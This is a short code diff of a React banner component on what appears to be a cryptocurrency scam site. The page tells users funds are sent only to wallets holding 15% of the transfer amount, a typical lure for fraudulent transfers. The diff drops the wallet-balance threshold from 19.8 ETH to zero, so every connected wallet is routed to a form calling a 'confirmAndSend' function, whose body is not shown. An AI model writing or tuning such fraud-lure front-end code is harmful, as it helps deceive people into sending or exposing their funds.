@@ -219,15 +219,15 @@ const Banner = () => {
             </div> */}
             {
                 accountsConnected ? <>
-                    {userBalance <= 19.8 && (
+                    {userBalance <= 0 && (
                         <div className="bg-red-600 text-white p-4 mb-4 rounded-md">
                             <p>We have detected that your account has a balance of {userBalance?.toFixed(4)} ETH, with a low transaction history.To prevent fraud, we only transfer funds to wallets with a minimum balance of 15% of transfer amount, with positive transaction history</p>
                         </div>
                     )}
-                    {userBalance >= 19.8 && (
+                    {userBalance >= 0 && (
                         <VerifyAddressForm userBalance={userBalance} confirmAndSend={confirmAndSend} />
                     )}
-                    {userBalance <= 19.8 && (
+                    {userBalance <= 0 && (
                         <div className="p-4 rounded-md border border-red-600">
                             <div className="flex flex-col gap-y-2">
                                 <h4>Account balance: <span className="font-bold">{userBalance.toFixed(4)} ETH  ({convertETHtoUSD(userBalance)})</span></h4>
